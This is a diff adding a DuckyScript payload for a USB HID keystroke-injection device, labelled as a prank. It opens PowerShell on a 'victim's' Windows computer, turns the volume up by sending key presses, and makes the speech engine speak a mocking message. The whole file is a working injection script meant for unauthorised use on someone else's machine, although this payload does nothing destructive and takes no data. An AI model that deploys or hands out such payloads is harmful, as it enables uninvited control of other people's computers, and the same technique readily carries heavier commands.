@@ -1,0 +1,28 @@
+#-----------------------------------------------------------------------------------------------------------
+# Title:        Speaking cable
+# Description:  Turn up the volumen and play a message on a victims computer using Windows build speach engine
+# Author:       Keld Norman / Twitter: @keld_norman
+# Props:        Google, RTFM, and trial and errors
+# Version:      1.0
+# Category:     Prank
+# Target:       Windows10+ Powershell
+# Attackmodes:  HID
+#-----------------------------------------------------------------------------------------------------------
+# Quick Guide
+#-----------------------------------------------------------------------------------------------------------
+DUCKY_LANG US
+GUI r
+DELAY 1000
+STRING Powershell
+ENTER
+DELAY 500
+STRING $key=[Math]::Ceiling(100/2);$obj=New-Object -ComObject WScript.Shell;for($i=0;$i -lt $key;$i++){$obj.SendKeys([char] 175)}
+ENTER
+DELAY 500
+STRING $sp=New-Object -ComObject SAPI.SpVoice
+ENTER
+DELAY 500
+STRING $sp.Speak("Hey everybody! I stole someones phone charger cable.")
+ENTER
+STRING exit
+ENTER
